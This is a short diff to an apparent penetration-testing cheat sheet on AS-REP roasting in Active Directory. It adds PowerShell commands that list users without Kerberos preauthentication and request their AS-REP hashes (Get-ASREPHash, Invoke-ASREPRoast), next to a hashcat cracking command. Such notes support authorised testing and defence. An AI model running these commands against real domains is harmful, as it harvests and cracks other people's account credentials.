@@ -21,11 +21,20 @@ hashcat -m 18200 -a 0 hashes.txt passwordlist.txt -O
 ```
 
 ##### Windows
+__AsRep not Required Users__
 ```powershell
 Get-DomainUser -PreauthNotRequired -Verbose
 ```
 ```powershell
 Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
+```
+__Get AsRep Request__
+```powershell
+Get-ASREPHash -UserName VPN1user -Verbose
+```
+
+```powershell
+Invoke-ASREPRoast -Verbose
 ```
 
 #### Force disable Kerberos Preauth
